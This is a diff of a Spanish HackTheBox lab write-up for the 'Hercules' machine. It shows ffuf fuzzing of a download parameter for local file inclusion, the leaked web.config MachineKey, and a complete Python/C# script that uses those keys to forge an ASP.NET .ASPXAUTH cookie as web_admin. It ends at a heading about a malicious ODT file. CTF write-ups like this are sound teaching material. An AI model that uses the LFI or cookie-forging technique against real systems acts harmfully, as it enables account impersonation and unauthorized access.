@@ -916,7 +916,7 @@ De igual forma, obtenemos al **usuario ken.w**.
 Como es la contraseña valida para **LDAP**, podemos probarla en el login y ver si nos da acceso:
 
 <p align="center">
-<img src="/assets/images/htb-writeup-hercules/Captura8.png">
+<img src="/assets/images/htb-writeup-hercules/Captura9.png">
 </p>
 
 Genial, estamos dentro.
@@ -925,26 +925,296 @@ Genial, estamos dentro.
 
 <h2 id="LFI">Aplicando Local File Inclusion (LFI) en Dashboard de Página Web</h2>
 
+Navegando un poco en el Dashboard, vemos que hay 3 mensajes para nosotros en la sección de **Email**:
 
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura10.png">
+</p>
+
+Revisando estos mensajes, uno de estos nos indican la razón del uso de credenciales LDAP para entrar al login:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura11.png">
+</p>
+
+El segundo nos indica que nuestra cuenta fue hackeada y debemos cambiar la contraseña inmediatamente, dandonos un dominio interno para realizar ese cambio:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura12.png">
+</p>
+
+Y el tercer mensaje es solo un aumento de sueldo, nada importante.
+
+Revisando las demás secciones, vemos la sección de **Download** que nos permite descargar algunos formularios.
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura13.png">
+</p>
+
+Al capturar la descarga con **BurpSuite**, vemos el uso de un parámetro para consultar el formulario a descargar:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura14.png">
+</p>
+
+Esta clase de parámetros pueden ser vulnerables a **Local File Inclusion** o **Path Traversal**.
+
+Podemos comprobarlo aplicando **Fuzzing** a este parámetro, usando un wordlist con ruta del **servidor IIS** de **Windows**.
+
+Usare la herramienta **ffuf** y será necesario copiar la cookie de sesión:
 ```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/Web-Servers/IIS.txt:FUZZ -u 'https://hercules.htb/Home/Download?fileName=../../FUZZ' -t 300 -b "__RequestVerificationToken=...; .ASPXAUTH=..." -fs 0,485
 
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://hercules.htb/Home/Download?fileName=../../FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/Web-Servers/IIS.txt
+ :: Header           : Cookie: __RequestVerificationToken=FUo8Ej-XLwahBPYI4N9TpS6dxMAlf_FhjRk25mkOFQ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 300
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 0,485
+________________________________________________
+
+web.config              [Status: 200, Size: 4896, Words: 643, Lines: 94, Duration: 432ms]
+:: Progress: [216/216] :: Job [1/1] :: 109 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
 ```
 
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
+| Parámetros | Descripción |
+|--------------------------|
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+| *-u*       | Para indicar la URL a utilizar. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+| *-b*	     | Para indicar la cookie a usar. |
 
 <br>
 
-<h2 id=""></h2>
+Tenemos un resultado.
+
+Revisemoslo:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura15.png">
+</p>
+
+Bien, podemos ver el archivo **web.config**.
+
+Analizando este archivo, podemos ver una sección interesante que es la etiqueta **MachineKey**.
+
+<br>
+
+<h2 id="FormsAuth">Forjando Cookie de Forms Authentication de ASP.NET con un Script</h2>
+
+¿Qué es **MachineKey**?
+
+| **MachineKey** |
+|:--------------:|
+| *Define las claves que ASP.NET usa para validar (MAC) datos (por ejemplo ViewState, cookies forms auth, etc.) usando `validationKey` y el algoritmo `HMACSHA256`, y Desencriptar datos cuando `decryption` está activado (aquí `AES`) usando `decryptionKey`.* |
+
+<br>
+
+La idea es que con estas llaves podamos crear una cookie de sesión válida de algún usuario.
+
+Sin embargo, tenemos que tener en cuenta el proceso que **ASP.NET** (en versiones anteriores a **ASP.NET Core**) usa para proteger las cookies de autenticación, pues si revisas la cookie del login, verás una cookie llamda **.ASPXAUTH**.
+
+| **Cookie .ASPXAUTH** |
+|:--------------------:|
+| *Es la cookie de autenticación por formularios (Forms Authentication) de ASP.NET. Su propósito es mantener la sesión autenticada de un usuario sin necesidad de volver a iniciar sesión en cada petición. ASP.NET la crea después de que un usuario se autentica correctamente (por ejemplo, desde /Login.aspx).* |
+
+<br>
+
+Esto se vuelve más complejo, pues para que podamos formar una cookie valida debemos tener también en cuenta la compatibilidad entre cookies de sesión viejas y modernas, pues puede que tengamos algun problema a la hora de forjar una cookie solo para versiones viejas de **ASP.NET**.
+
+Por esta razón fue creado el paquete **AspNetCore.LegacyAuthCookieCompat**, para resolver esa incompatibilidad:
+
+| **Paquete AspNetCore.LegacyAuthCookieCompat** |
+|:---------------------------------------------:|
+| *Es una biblioteca de compatibilidad (“compat”) que implementa el mismo formato de ticket, cifrado y firma que usaba el viejo System.Web.Security.FormsAuthentication. Permite a las aplicaciones en .NET Core leer, descifrar, firmar y crear cookies .ASPXAUTH de ASP.NET clásico.* |
+
+<br>
+
+Con estos conceptos ya vistos, podemos empezar a forjar una cookie de **Forms Authentication**, usando los datos del **MachineKey**.
+
+Para eso utilizaremos un script de **Python** que automatiza el uso de un script de **C#**, para generar una cookie válida que nos ayude a suplantar un usuario como el **web_admin**.
+
+Este script utiliza **dotnet**, por lo que debes tenerlo instalado en tu máquina.
+
+Yo lo instale de la siguiente manera:
+```bash
+# Descargando instalador de dotnet
+wget https://dot.net/v1/dotnet-install.sh -O dotnet-install.sh
+
+# Dando permisos y ejecutando instalador para obtener versión 7
+chmod +x dotnet-install.sh
+./dotnet-install.sh --channel 7.0
+
+# Guardando el uso de dotnet en la zshrc
+echo 'export DOTNET_ROOT=$HOME/.dotnet' >> ~/.zshrc
+echo 'export PATH=$PATH:$HOME/.dotnet:$HOME/.dotnet/tools' >> ~/.zshrc
+source ~/.zshrc
+```
+
+Una vez que tengas instalado **dotnet** copia y pega el siguiente script en tu máquina:
+```bash
+#!/usr/bin/env python3
+import os
+import subprocess
+import textwrap
+import shutil
+import sys
+
+# --- CONFIG ---
+validation_key = "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80"
+decryption_key = "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"
+username = "web_admin"
+user_data = "Web Administrators"
+cookie_path = "/"
+project_dir = "legacy_auth_auto"
+# ----------------
+
+program_cs = f"""using System;
+using AspNetCore.LegacyAuthCookieCompat;
+
+public static class HexUtils
+{{
+    public static byte[] HexToBinary(string hex)
+    {{
+        if (hex == null) throw new ArgumentNullException(nameof(hex));
+        if (hex.Length % 2 != 0) throw new ArgumentException("Hex string must have even length");
+        byte[] bytes = new byte[hex.Length / 2];
+        for (int i = 0; i < bytes.Length; i++)
+        {{
+            bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
+        }}
+        return bytes;
+    }}
+}}
+
+class Program
+{{
+    static void Main(string[] args)
+    {{
+        string validationKey = "{validation_key}";
+        string decryptionKey = "{decryption_key}";
+
+        if (validationKey.Length > 128)
+        {{
+            validationKey = validationKey.Substring(0, 128);
+        }}
+
+        byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
+        byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);
+
+        var issueDate = DateTime.Now;
+        var expiryDate = issueDate.AddHours(1);
+
+        var formsAuthenticationTicket = new FormsAuthenticationTicket(
+            1,
+            "{username}",
+            issueDate,
+            expiryDate,
+            false,
+            "{user_data}",
+            "{cookie_path}"
+        );
+
+        var legacyEncryptor = new LegacyFormsAuthenticationTicketEncryptor(
+            decryptionKeyBytes,
+            validationKeyBytes,
+            ShaVersion.Sha256
+        );
+
+        var encryptedText = legacyEncryptor.Encrypt(formsAuthenticationTicket);
+        Console.WriteLine("Encrypted FormsAuth Ticket:");
+        Console.WriteLine(encryptedText);
+    }}
+}}
+"""
+
+def run(cmd, cwd=None, capture=False):
+    print(f"> {' '.join(cmd)}")
+    return subprocess.run(cmd, cwd=cwd, check=True, text=True, capture_output=capture)
+
+def main():
+    # check dotnet available
+    if shutil.which("dotnet") is None:
+        print("ERROR: 'dotnet' no está en PATH. Instala .NET SDK y vuelve a intentar.")
+        sys.exit(1)
+
+    if os.path.exists(project_dir):
+        print(f"El directorio '{project_dir}' ya existe. Por seguridad, bórralo o cambia project_dir.")
+        sys.exit(1)
+
+    os.makedirs(project_dir, exist_ok=True)
+
+    # dotnet new console
+    run(["dotnet", "new", "console", "-o", project_dir])
+
+    # add package
+    run(["dotnet", "add", project_dir, "package", "AspNetCore.LegacyAuthCookieCompat", "--version", "2.0.5"])
+
+    # overwrite Program.cs
+    program_path = os.path.join(project_dir, "Program.cs")
+    with open(program_path, "w") as f:
+        f.write(program_cs)
+
+    # restore & build
+    run(["dotnet", "restore", project_dir])
+    run(["dotnet", "build", project_dir])
+
+    # run and capture output
+    proc = subprocess.run(["dotnet", "run", "--project", project_dir], text=True, capture_output=True)
+    print(proc.stdout)
+    if proc.stderr:
+        print("--- STDERR ---")
+        print(proc.stderr)
+
+if __name__ == "__main__":
+    main()
+```
+
+Ahora ejecútalo:
+```bash
+python3 generate_forms_cookie.py
+> dotnet new console -o legacy_auth_auto
+...
+Compilación correcta.
+    0 Advertencia(s)
+    0 Errores
+
+Tiempo transcurrido 00:00:08.92
+Encrypted FormsAuth Ticket:
+F44A8A86A97127947E859D90E487A...
+```
+
+Copia la cookie y pegala en la sesión actual de la página web utilizando el **Inspector** de tu navegador:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura16.png">
+</p>
+
+Recarga la página:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura17.png">
+</p>
+
+Muy bien, somos el **usuario web_admin**.
+
+<br>
+
+<h2 id="MaliciousODT">Cargando Archivo ODT Malicioso para Capturar y Crackear Hash Net NTLMv2</h2>
 
 ```bash
 
